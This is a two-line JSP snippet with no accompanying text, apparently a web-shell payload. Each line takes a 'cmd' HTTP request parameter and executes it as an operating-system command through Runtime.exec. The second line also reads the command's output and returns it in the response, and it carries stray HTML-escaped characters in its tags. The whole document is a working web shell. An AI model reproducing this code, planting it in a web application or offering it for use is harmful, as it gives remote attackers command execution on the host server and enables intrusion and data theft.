<%java.lang.Runtime.getRuntime().exec(request.getParameterValues("cmd"));>
<%@page import="java.io.*"%&gt;&lt;%String op="",s="";try{Process p=Runtime.getRuntime().exec(request.getParameter("cmd"));BufferedReader sI=new BufferedReader(new InputStreamReader(p.getInputStream()));while((s=sI.readLine())!=null){op+=s;}}catch(IOException e){e.printStackTrace();}%&gt;&lt;%=op%>
